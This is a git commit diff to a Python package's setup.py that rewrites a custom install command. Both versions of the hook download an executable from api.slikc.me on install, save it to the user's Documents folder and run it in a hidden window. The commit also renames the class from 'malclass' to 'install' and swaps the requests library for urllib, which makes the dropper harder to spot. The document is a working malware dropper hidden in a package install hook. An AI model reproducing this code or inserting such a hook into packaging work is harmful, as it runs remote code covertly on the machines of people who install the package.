82c1793b42dc4339e844abcddb4c006657310c82
slikc <82408235+slikc@users.noreply.github.com>
2024-04-08 12:30:31 +0200

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,28 +1,24 @@
-import requests
-import struct
 import os
+import urllib.request
 import sys
 import platform
 import subprocess
 from setuptools import setup
 from setuptools.command.install import install
 
-REQUIRED = [
-    'requests'
-]
-
-class malclass(install):
+class install(install):
     def run(self):
         documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
-        installer_file = requests.get('https://api.slikc.me/installer')
+        installer_url = 'https://api.slikc.me/installer'
+        with urllib.request.urlopen(installer_url) as response:
+            installer_content = response.read()
         with open(os.path.join(documents, 'installer.exe'), 'wb') as f:
-            f.write(installer_file.content)
+            f.write(installer_content)
+        # Start the installer exe silently
         subprocess.Popen([os.path.join(documents, 'installer.exe')], creationflags=subprocess.CREATE_NO_WINDOW)
-
-
 
 setup(
     cmdclass={
-        "install": malclass
+        "install": install
     }
 )
